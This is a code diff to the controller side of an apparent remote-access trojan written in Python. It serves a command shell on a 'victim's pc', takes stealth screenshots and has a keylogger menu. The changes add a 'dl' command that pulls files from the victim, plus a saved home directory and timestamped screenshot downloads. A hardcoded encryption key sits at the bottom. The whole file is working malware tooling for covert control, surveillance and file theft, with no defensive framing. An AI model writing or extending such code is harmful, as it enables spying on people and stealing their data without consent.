@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*
-import socket,os, platform, time, encrypted_connection
+import socket,os, platform, time, encrypted_connection, datetime
 HOST = '0.0.0.0' #Set as every ip address can connect to the server.
 PORT = 6969
-
+defaultPath = None
 def consoleCleaner(enterToContinue): #When called, clear the console. If called with True argument, wait for enter to continue.
     if enterToContinue == True :
         try:
@@ -118,9 +118,16 @@ def KeyLogger(): #Keylogger menu -  If chosen, display the Keylogger menu and cr
     while exitKeyLogger :
         menu("keylogger")
         exitKeyLogger = selection("keylogger",input(">"))
-def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that interact with victim's pc.
+def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that interact with victim's pc.cat
+    global defaultPath
     encrypter.send_message_server("getpath")
     client_path = encrypter.receive_message_server()
+    if defaultPath is None :
+        defaultPath = client_path
+    else:
+        encrypter.send_message_server("cd "+ defaultPath)
+        encrypter.receive_message_server()
+        client_path = defaultPath
     while True:
         command = input(client_path+ " > ")
         if((command == "stb") & (screenThatbeachAcces == False)) :
@@ -128,6 +135,9 @@ def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that
         elif((command == "stb") & (screenThatbeachAcces == True)):
             print("taking the screenshot")
             screenThatbeach()
+        elif("dl" in command):
+            command_split = command.split()
+            downloadFile(command_split[1])
         elif((command == "keylogger") & (keyLogger == False)):
             print("Acces forbidden")    
         elif((command == "keylogger") & (keyLogger == True)):
@@ -135,6 +145,12 @@ def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that
             #client_socket.send(command.encode("utf-8"))
         elif(command == "state"):
             print(OsVictimInfos)
+        elif(command == "home"):
+            encrypter.send_message_server("cd "+ defaultPath)
+            client_path = defaultPath
+            encrypter.receive_message_server()
+        elif(command == "clear"):
+            consoleCleaner(False)
         elif(command == "quit"):
             consoleCleaner(False)
             break
@@ -145,7 +161,7 @@ def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that
                     #client_socket.send(command.encode("utf-8"))
                     message = encrypter.receive_message_server()
                     #print(client_socket.recv(2048).decode("utf-8")+"\n")
-                    if "Directory :" in message :
+                    if "Directory : " in message :
                         useless, client_path = message.split(" : ")
                     else :
                         print(message)
@@ -157,26 +173,33 @@ def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that
                     continue
 def screenThatbeach(): #If chosen, take a stealth screenshot of the victim and save it in the .py executed path.
     encrypter.send_message_server("stb")
-    #client_socket.send(("stb").encode("utf-8"))
-    rawData = encrypter.receive_message_server()
-    #rawData = client_socket.recv(1024)
-    print(rawData)
-    data = rawData
-    if str(data) == "capturing" :
-        print("Capturing data")
-        pic = open("new" + data + ".png", "wb")
-        img = bytes(encrypter.receive_picture_server())
-        pic.write(img)
-        while not ("completed" in str(img)):
-            img = bytes(encrypter.receive_picture_server())
-            pic.write(img)
-        pic.close()
-        os.system("qlmanage -p new" + data + ".png >/dev/null 2>&1" )
-        consoleCleaner(False)
-    else:
-        print("You do not have permissions to create a file there.")
+    captureName = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
+    path = "captures"
+    try :
+        if encrypter.DownloadFile(path, captureName):
+            print("Download sucessful.")
+            os.system("qlmanage -p " + path + "/"+ captureName + ">/dev/null 2>&1" )
+            consoleCleaner(False)
+        else :
+            print("You do not have permissions to create a file there.")
+    except :
+        print("Problem in definition.")
         consoleCleaner(True)
-
+def downloadFile(fileName : str):
+    encrypter.send_message_server("dl "+ fileName)
+    path = "downloaded_files"
+    try :
+        if encrypter.DownloadFile(path, fileName):
+            print("Download sucessful.")
+            os.system("qlmanage -p " + path + "/"+ fileName + ">/dev/null 2>&1" )
+            consoleCleaner(False)
+        else :
+            print("You do not have permissions to create a file there.")
+    except :
+        print("Problem in definition.")
+        consoleCleaner(True)
+    
+    
 # STARTING MAIN LOOP.
 #Calling the function to set the secret key
 encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
